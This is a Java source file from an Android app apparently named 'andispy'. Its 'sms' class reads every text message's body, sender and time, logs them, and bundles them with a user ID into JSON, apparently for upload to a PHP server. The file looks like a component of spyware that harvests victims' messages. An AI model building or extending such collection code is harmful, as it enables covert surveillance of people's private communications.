package com.andispy.andispy.data;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.Timestamp;



public class sms {
    JSONObject objAndroid = new JSONObject();
    JSONObject objPhp = new JSONObject();
    JSONArray postjson_msgnumber=new JSONArray();
    JSONArray postjson_msgtime=new JSONArray();
    JSONArray postjson_msgbody=new JSONArray();
    JSONArray postjson_ID=new JSONArray();

    Context context;
    @SuppressWarnings("deprecation")
    public sms(Context c) {
        context=c;
    }
    public JSONObject GetMessageList(Cursor cursor)
    {
        SharedPreferences pref = context.getSharedPreferences("MyPref", context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String 	User=pref.getString("User_ID", null);
        //Toast.makeText(context,User,Toast.LENGTH_SHORT).show();


        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));

                String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));

                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));

                Timestamp smsDayTime = new Timestamp(Long.valueOf(date));
                String time=smsDayTime.toString();


                Log.d("numebr", number);
                Log.d("smsDayTime", time);
                Log.d("body", body);


//                postjson_msgnumber.put(number);
//                postjson_msgtime.put(time);
//                postjson_msgbody.put(body);
//                postjson_ID.put(User);

                postjson_msgnumber.put(number);
                postjson_msgtime.put(time);
                postjson_msgbody.put(body);
                postjson_ID.put(User);
                cursor.moveToNext();
            }

        }
        try {
            objAndroid.put("RegID",postjson_ID);
            objAndroid.put("msgnumber",postjson_msgnumber);
            objAndroid.put("msgdatetime",postjson_msgtime);
            objAndroid.put("msgbody",postjson_msgbody);
            objPhp.put("req",objAndroid);


        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return objPhp;
    }

}
